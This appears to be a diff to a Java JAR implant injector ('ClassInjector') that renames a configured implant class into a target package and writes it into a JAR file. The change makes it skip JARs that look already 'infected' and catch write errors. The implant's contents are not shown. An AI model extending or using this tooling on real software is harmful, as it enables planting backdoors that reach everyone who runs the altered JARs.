@@ -8,6 +8,7 @@ import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 import java.nio.file.Path;
 import java.util.jar.JarEntry;
+import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
 
@@ -34,8 +35,8 @@ public class ClassInjector {
                     entry.forward();
                     continue;
                 }
-                if (entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
-                    System.out.println("[-] WARNING: It looks like this JAR may already be infected. Proceeding anyway.");
+                if (entry.getName().endsWith("/" + IMPLANT_CLASS_NAME + ".class") || entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
+                    System.out.println("[-] Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
                     entry.forward();
                     continue;
                 }
@@ -54,8 +55,14 @@ public class ClassInjector {
                     ClassFile implant = implantHandler.loadFreshConfiguredSpecimen();
                     deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                     JarEntry newJarEntry = convertToJarEntry(implant);
-                    implant.write(fiddler.addNewEntry(newJarEntry));
-                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+                    try {
+                        implant.write(fiddler.addNewEntry(newJarEntry));
+                        System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+                    } catch (ZipException e) {
+                        System.out.println("[-] Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
+                        entry.forward();
+                        continue;   // TODO Signal these different endgames using exceptions instead
+                    }
 
                     implantedClass = implant;
                 }
